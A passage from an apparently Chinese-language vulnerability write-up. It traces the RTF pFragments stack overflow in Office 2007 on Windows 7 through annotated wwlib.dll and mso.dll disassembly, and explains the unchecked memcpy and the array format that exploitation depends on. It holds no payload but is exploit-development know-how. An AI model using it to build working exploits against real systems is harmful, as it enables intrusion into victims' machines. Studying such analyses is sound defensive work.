<span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C]         <span class="comment">;   eax = [ebp+0x14] = [0x0011fe18] = 0x41326241(a5)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595A7                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]             <span class="comment">; arg4: [ebp+0x18] = [0x0011fe1c] = 0x62413362(a6)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595AA                 <span class="keyword">neg</span>     <span class="built_in">eax</span>                      <span class="comment">;   按位取反再加1，eax = 0xbecd9dbf</span></span><br><span class="line"><span class="symbol">.text:</span>32E595AC                 <span class="keyword">sbb</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   带借位减法,eax = eax-eax-cf = 0xffffffff</span></span><br><span class="line"><span class="symbol">.text:</span>32E595AE                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_8]         <span class="comment">;   ecx = ebp-8 = 0x0011fe04-8 = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">.text:</span>32E595B1                 <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>                 <span class="comment">;   eax = eax&amp;ecx = 0x0011fdfc</span></span><br><span class="line"><span class="symbol">.text:</span>32E595B3                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg3: eax = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">.text:</span>32E595B4                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">; arg2: [ebp+8] = [0x0011fe04+8] = [0x0011fe0c] = 0x41386141(a2)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595B7                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+var_10]             <span class="comment">; arg1: [ebp-0x10] = [0x0011fe04-0x10] = [0x0011fdf4] = 0x41306141(pFragments属性起始数据) &lt;----(4)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595BA                 <span class="keyword">call</span>    sub_32E5941B             <span class="comment">;</span></span><br><span class="line"><span class="symbol">.text:</span>32E595BF                 <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    ****************************************************************************************</span><br><span class="line"></span><br><span class="line">        char __userpurge sub_32E5941B@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">edi</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span><br><span class="line"></span><br><span class="line">    ****************************************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>32E5941B                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe04</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5941C                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011fdcc </span></span><br><span class="line"><span class="symbol">    .text:</span>32E5941E                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">;   ecx = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">    .text:</span>32E5941F                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">;   ecx = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">    .text:</span>32E59420                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                      <span class="comment">;   ebx = 0x05000000 </span></span><br><span class="line"><span class="symbol">    .text:</span>32E59421                 <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span>                 <span class="comment">;   ebx = ebx^ebx = 0x00000000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59423                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_C], <span class="built_in">ebx</span>         <span class="comment">;   [ebp+0x14] = [0x0011fdcc+0x14] = [0x0011fde0] = 0x62413362(a5)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59426                 <span class="keyword">jnz</span>     short loc_32E59439       <span class="comment">;   不为零跳转，这里跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59428                 <span class="keyword">push</span>    <span class="number">33757061h</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5942D                 <span class="keyword">call</span>    sub_32E6AEA8</span><br><span class="line"><span class="symbol">    .text:</span>32E59432</span><br><span class="line"><span class="symbol">    .text:</span>32E59432 loc_32E59432:                          </span><br><span class="line"><span class="symbol">    .text:</span>32E59432                 <span class="keyword">xor</span>     <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59434</span><br><span class="line"><span class="symbol">    .text:</span>32E59434 loc_32E59434:                          </span><br><span class="line"><span class="symbol">    .text:</span>32E59434                 <span class="keyword">pop</span>     <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59435                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59436                 <span class="keyword">retn</span>    <span class="number">10h</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59439 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59439</span><br><span class="line"><span class="symbol">    .text:</span>32E59439 loc_32E59439:                           </span><br><span class="line"><span class="symbol">    .text:</span>32E59439                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_0], <span class="built_in">ebx</span>         <span class="comment">;   [ebp+0x8] = [0x0011fdcc+0x8] = [0x0011fdd4] = 0x41306141(a2)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5943C                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_8], <span class="built_in">ebx</span>         <span class="comment">;   [ebp-8] = [0x0011fdcc-8] = [0x0011fdc4] = 0x0011fdfc</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5943F                 <span class="keyword">jz</span>      short loc_32E59451       <span class="comment">;   等于0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59441                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">; arg2: [ebp+8] = [0x0011fdcc+8] = [0x0011fdd4] = 0x41306141(a2) &lt;----(3)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59444                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]         <span class="comment">;   eax = ebp-8 = 0x0011fdc4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59447                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg1: eax = 0x0011fdc4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59448                 <span class="keyword">call</span>    sub_32CF3807             <span class="comment">; </span></span><br><span class="line"><span class="symbol">    .text:</span>32E5944D                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        **************************************************</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> __stdcall sub_32CF3807(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">        **************************************************</span><br><span class="line"><span class="symbol">        .text:</span>32CF3807                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">; ebp = 0x0011fdcc</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3808                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">; ebp = esp = 0x0011fdb0</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF380A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]         <span class="comment">; eax = [0x0011fdb0+0xc] = [0x0011fdbc] = 0x41306141(a2) &lt;----(2)</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF380D                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, loc_32CF3820[<span class="built_in">eax</span>*<span class="number">8</span>] <span class="comment">; eax = eax*8+0x32CF3820 = 0x3c524228 </span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3814                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">4</span>]             <span class="comment">; ecx = [0x3c524228+4] = [0x3c52422c] = ???????? 不可访问 &lt;----(1)</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3817                 <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFh</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF381D                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF381E                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="symbol">        .text:</span>32CF3820 loc_32CF3820:                           <span class="comment">; DATA XREF: sub_32CF3807+6↑o</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3820                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">        .text:</span>32CF3823                 <span class="keyword">call</span>    sub_326CC86E</span><br><span class="line"><span class="symbol">        .text:</span>32CF3828                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3829                 <span class="keyword">retn</span>    <span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;根据以上结果，我们可以知道，<code>此异常</code>是因为<code>栈上的数据</code>已经<code>被破坏</code>了之后，<code>重新读取</code>被破坏区域的栈数据，计算出一个<code>不可访问的地址</code>，并对其进行<code>读取</code>，造成<code>非法内存访问</code>。在函数<code>sub_32E5955E</code>中，通过<code>0x066a55e0</code>处的<code>对象</code>，调用了<code>虚函数sub_327C002C</code>，在这个虚函数中通过<code>memcpy</code>函数将样本中<code>pFragments属性的值</code>复制到<code>栈</code>上，但并<code>未检查</code>其复制长度，造成了<code>栈溢出</code>。pFragments属性数据的<code>源地址</code>和<code>复制数据长度</code>都已经解析完成，并保存在<code>0x066a55e0</code>处的<code>对象</code>的<code>成员变量</code>中。pFragments属性数据在<code>栈</code>上的<code>起始地址</code>为<code>0x0011fdf4</code>，而复制数据的长度为<code>0xc8ac</code>，0x0011fdf4+0xc8ac=0x0012c6a0<code>小于0x00130000</code>，所以没像在<code>Windows XP</code>中那样，在复制数据过程中就触发异常，而是在访问被破坏的栈数据后，造成<code>非法内存访问</code>。</p>
<h3 id="0x33-pFragments属性数据“6-5-”的含义及其合法值"><a href="#0x33-pFragments属性数据“6-5-”的含义及其合法值" class="headerlink" title="0x33 pFragments属性数据“6;5;”的含义及其合法值"></a>0x33 pFragments属性数据“6;5;”的含义及其合法值</h3><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p>
<p>&emsp;&emsp;这个点，我看网上的分析文章都没有介绍到，也可能有人写了，我没找到。如果没弄清楚这个，就无法成功编写利用程序，我们需要注意每一个细节，才能最终成功利用一个漏洞。</p>
<p>&emsp;&emsp;在<code>RTF v1.9.1</code>版本的参考文档中(Document Area-&gt;Drawing Objects-&gt;Drawing Object Properties-&gt;Geometry)，是这样介绍的：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Property</th>
<th style="text-align:left">Meaning</th>
<th style="text-align:center">Type of value</th>
<th style="text-align:center">Default</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">pFragments</td>
<td style="text-align:left">Fragments are optional, additional parts to the shape. They allow the shape to contain multiple paths and parts. This property lists the fragments of the shape.</td>
<td style="text-align:center">Array</td>
<td style="text-align:center">Null</td>
</tr>
</tbody>
</table>
<p>&emsp;&emsp;<code>Fragments</code>是可选的，形状的附加部分。它们允许<code>形状</code>包含多个<code>路径</code>和<code>部件</code>。此属性列出<code>形状</code>的Fragments。其<code>属性值</code>是一个<code>Array</code>，默认值为<code>Null</code>。</p>
<p>&emsp;&emsp;<code>数组</code>的格式为由<code>分号</code>分隔的<code>数字序列</code>。 <code>第一个数字</code>表示数组中<code>每个元素的大小</code>(以字节为单位)。每个元素的字节数可以是<code>2、4或8</code>。当元素的大小为<code>8</code>时，每个元素表示为<code>一组两个数字</code>，但是根据下面的分析，<code>每组数字</code>使用的括号为<code>&quot;()&quot;</code>，而非<code>&quot;{}&quot;</code>。<code>第二个数字</code>表示数组中的<code>元素数</code>。 例如，<code>方形多边形</code>的点可以写为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;sv 8;4;&#123;0,0&#125;;&#123;100,0&#125;;&#123;100,100&#125;;&#123;0,100&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里已经说得<code>比较清楚</code>了，但是这些还不够，我们还需要通过<code>具体的程序</code>来进一步理解。我们需要找到程序中<code>处理这部分的代码</code>，仔细阅读。<code>怎么找到</code>，成为了一个新问题。</p>
<p><strong><code>找关键位置所用方法：</code></strong></p>
<blockquote>
<ul>
<li>1、前面调试时，<code>关键对象</code>的地址为<code>0x066a55e0</code>，但是每次<code>重新调试</code>，这个对象的位置都会<code>改变</code>，也<code>有可能</code>和<code>之前的调试</code>分配一样的地址。</li>
<li>2、在<code>Attach</code>目标程序后，对<code>0x066a55e0</code>对象的<code>前0x10字节</code>内存下<code>内存写断点</code>(0x066a55e0的<code>第一个dword</code>为<code>虚表指针</code>，<code>0x066a55ec</code>为<code>复制长度0xc8ac</code>所在对象成员变量的内存地址)。</li>
<li>3、再运行程序，如果已经执行到之前<code>调试奔溃时</code>代码区域的最顶层函数<code>sub_32E5955E</code>,还未断下来，则关闭调试器，重新<code>再来一遍</code>。</li>
<li>4、直到某一次程序对<code>关键对象</code>的地址分配到<code>0x066a55e0</code>，则会断在对<code>关键对象</code>初始化的位置，这时栈窗口会出现<code>&quot;pFragments&quot;</code>和<code>&quot;11111111acc8d9e9bdbfaf3c......&quot;</code>的字样，此时的代码就是Office处理<code>&quot;pFragments&quot;属性值</code>的代码片段。</li>
<li>5、然后根据<code>调用堆栈</code>，可以找到<code>当前函数地址</code>，以及当前函数的<code>调用地址</code>，及其<code>父函数</code>等等。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;如此，我们就已经找到处理<code>&quot;pFragments&quot;属性值</code>的代码片段。对<code>“6;5;”</code>的处理代码应该就在附近，我们对找到的代码片段进行<code>详细分析</code>，本次调试记录中的<code>关键对象</code>地址为<code>0x05D755C8</code>，在<code>MSO_379</code>得到分配，画<code>“&lt;----”</code>的为关键位置，处理后的结果如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br></pre></td><td class="code"><pre><span class="line">*******************************************</span><br><span class="line"></span><br><span class="line">    所属模块: wwlib.dll</span><br><span class="line">    <span class="keyword">int</span> __stdcall sub_31FD724E(<span class="keyword">int</span> *a1)</span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line"><span class="symbol">.text:</span>31FD724E                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011DD20</span></span><br><span class="line"><span class="symbol">.text:</span>31FD724F                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                     <span class="comment">;   ebp = esp = 0x0011B268</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7251                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">64h</span>                     <span class="comment">;   esp = esp-0x64 = 0x0011B204</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7254                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                          <span class="comment">;   ebx = 0x00594264</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7255                 <span class="keyword">push</span>    <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x05D66800</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7256                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_0]             <span class="comment">;   esi = [ebp+8] = [0x0011B268+8] = [0x0011B270] = 0x00594264(a1) &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7259                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">esi</span>]                   <span class="comment">;   ebx = [esi] = [0x00594264] = 0x02340000 &lt;---- </span></span><br><span class="line"><span class="symbol">.text:</span>31FD725B                 <span class="keyword">and</span>     [<span class="built_in">ebp</span>+arg_0], <span class="number">0</span>               <span class="comment">;   [ebp+8]&amp;0 = 0x00594264&amp;0 = 0x0</span></span><br><span class="line"><span class="symbol">.text:</span>31FD725F                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">;   edi = 0x020B4500,ASCII "pFragments"</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7260                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebx</span>+<span class="number">8Ch</span>]               <span class="comment">;   edi = [ebx+0x8c] = [0x0234008c] = 0x05D66800</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7266                 <span class="keyword">push</span>    <span class="number">0</span>                            <span class="comment">; arg2: 0</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7268                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">; arg1: edi = 0x05D66800(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7269                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_10], <span class="built_in">ebx</span>            <span class="comment">;   [ebp-0x10] = [0x0011B258] = 0x02340000</span></span><br><span class="line"><span class="symbol">.text:</span>31FD726C                 <span class="keyword">call</span>    sub_312C7431                 <span class="comment">;   </span></span><br><span class="line"><span class="symbol">.text:</span>31FD7271                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">edi</span>+<span class="number">556h</span>]              <span class="comment">;   edi = [edi+0x556] = [0x05D66D56] = 0x020D0E00(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7277                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">761Ch</span>]             <span class="comment">;   eax = [ebx+0x761] = [0x02340761] = 0x05D7E120</span></span><br><span class="line"><span class="symbol">.text:</span>31FD727D                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_64]            <span class="comment">;   ecx = ebp-0x64 = 0x0011B268-0x64 = 0x0011B204</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7280                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                          <span class="comment">; arg3: ecx = 0x0011B204</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7281                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">7670h</span>]        <span class="comment">; arg2: [ebx+0x7670] = [0x02347670] = 0x020B4500,ASCII "pFragments" &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7287                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_14], <span class="built_in">eax</span>            <span class="comment">;   [ebp-0x14] = [0x0011B254] = eax = 0x05D7E120</span></span><br><span class="line"><span class="symbol">.text:</span>31FD728A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>]                   <span class="comment">;   eax = [edi] = [0x020D0E00] = 0x329D4ED4(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD728C                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">; arg1: edi = 0x020D0E00(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD728D                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_18], <span class="built_in">edi</span>            <span class="comment">;   [ebp-0x18] = [0x0011B250] = edi = 0x020D0E00(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7290                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">158h</span>]         <span class="comment">; [eax+0x158] = [0x329D4ED4+0x158] = [0x329D502C] = 0x329202C7(虚函数地址)</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    *****************************************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        signed <span class="keyword">int</span> __stdcall sub_329202C7(<span class="keyword">int</span> a1, const CHAR *a2, _<span class="built_in">DWORD</span> *a3)</span><br><span class="line"></span><br><span class="line">    *****************************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>329202C7                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>329202C8                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                     <span class="comment">;   ebp = esp = 0x0011B1E4</span></span><br><span class="line"><span class="symbol">    .text:</span>329202CA                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]                  <span class="comment">; arg3: [ebp+0xc] = [0x0011B1E4+0xC] = [0x0011B1F0] = 0x020B4500(a2),ASCII "pFragments"</span></span><br><span class="line"><span class="symbol">    .text:</span>329202CD                 <span class="keyword">push</span>    <span class="number">1</span>                            <span class="comment">; arg2: 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>329202CF                 <span class="keyword">call</span>    MSO_7788                     <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span><span class="number">32604566</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, dword_33426764          <span class="comment">; eax = [0x33426764] = 0x32600000(ImageBase)</span></span><br><span class="line"><span class="symbol">        .text:</span>3260456B                 <span class="keyword">retn</span>                                 <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>329202D4                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">; arg1: eax = 0x32600000(ImageBase)</span></span><br><span class="line"><span class="symbol">    .text:</span>329202D5                 <span class="keyword">call</span>    MSO_763                      <span class="comment">; 对"pFragments"进行一些操作，如转化为Unicode，并在前面加上"pFragments"的ASCII形式的长度</span></span><br><span class="line"><span class="symbol">    .text:</span>329202DA                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">0FFFFh</span>                  <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202DF                 <span class="keyword">jz</span>      loc_32D8FCA5                 <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202E5                 <span class="keyword">push</span>    